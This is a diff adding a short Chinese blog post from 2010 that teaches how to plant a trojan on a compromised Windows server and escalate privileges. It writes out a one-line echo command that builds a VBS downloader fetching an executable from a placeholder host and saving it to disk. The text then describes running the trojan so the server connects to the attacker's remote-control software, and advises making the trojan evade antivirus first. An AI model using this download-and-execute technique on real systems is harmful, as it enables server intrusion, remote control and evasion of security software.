@@ -1,0 +1,16 @@
+利用VBS脚本种马,提权服务器 
+2010年02月27日 星期六 02:30
+
+利用VBS脚本种马,提权服务器,是在服务器支持Wscript.Shell组件
+但是很多命令都禁掉的情况下的一种提权方法,肯定不用说,net user, net1这写了!
+
+我们有这样一段脚本,如下:
+=================================================================
+echo Set xPost = CreateObject(^"Microsoft.XMLHTTP^"):xPost.Open ^"GET^",^"http://www.xxxx.com/1.exe^",0:xPost.Send():Set sGet = CreateObject(^"ADODB.Stream^"):sGet.Mode = 3:sGet.Type = 1:sGet.Open():sGet.Write(xPost.responseBody):sGet.SaveToFile ^"1.exe^",2 >sysinfo.vbs
+=================================================================
+
+这段代码什么意识呢?   就是在你说指定的目录建立一个名为sysinfo.vbs的vbs脚本程序,
+建立之后,sysinfo.vbs   从而运行脚本,(http://www.xxxx.com/1.exe)这的地址下载你事先准备好了的
+名为1.exe的木马程序, 然后接着运行,你的木马程序,你的目的就到达了!你所提权的服务器就在你的远
+程软件上上线了,当然了,要是服务器杀毒软件一般都是比较强悍的话,所以你的木马要事先免杀好!
+
